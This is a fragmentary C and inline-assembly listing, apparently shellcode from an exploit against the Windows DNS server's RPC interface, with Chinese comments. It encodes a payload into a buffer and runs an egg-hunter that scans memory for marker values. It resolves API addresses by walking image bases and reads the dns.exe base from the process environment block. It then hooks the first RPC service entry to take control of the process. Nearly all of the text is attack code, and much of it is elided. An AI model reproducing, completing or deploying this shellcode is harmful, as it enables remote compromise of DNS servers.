...
int findcodeshell(char *codebuff,int bufflen,char *shell,int shelllen)
{
    int i; //,k;
	unsigned char temp;
    ...
    for(i=0;i<shelllen;++i)
	{
		 ...
		 temp=shell[i];
         codebuff[2*i]=DATABASE+temp/0x10;
		 codebuff[2*i+1]=DATABASE+temp%0x10;
...
void findshellcodefn()
{
   ...
   if(k==0){
	  ...
	  {      
		    k=0;
			if(*(int *)(ecb)==0x35353535&&*(int *)(ecb+4)==0x36363636)
			{

				for(l=0;*(char *)(ecb+l+8)!=0;++l)
				{
			
                }
				if(*(int *)(ecb+l)==0x36363636&&*(int *)(ecb+l+4)==0x35353535)	break;
            }
 	  } 
	...
	_asm {            jmp    nextcall
	   ...
	   *(int *)(k+5)=0xc3;
       ...
       for(;imgbase<0xbffa0000,procgetadd==0;){
			imgbase+=0x10000;
			if(imgbase==0x7f000000) imgbase=0xbff00000;
...
//注意这儿处理了搜索页面不在情况。
 ...
 //  HOOK 第一个RPC服务入口。
		 ...
		 *(int *)(0x7ffdf008); // dns.exe address;
		 _asm{
		    call getexceptretadd
		 }
		 ++i;
		 for(;;++i){
    		 if(*(int *)i==0x44&&*(int *)(i+4)==0x50abc2a4&&*(int *)(i+0x2c)!=0)
			 {
                 i=*(int *)(i+0x2c);
	    		 i=*(int *)(i+4);
		    	 *(int *)(i+RPCHOOKNUM*4)=k;
				 break;
			 }
		 } 		   
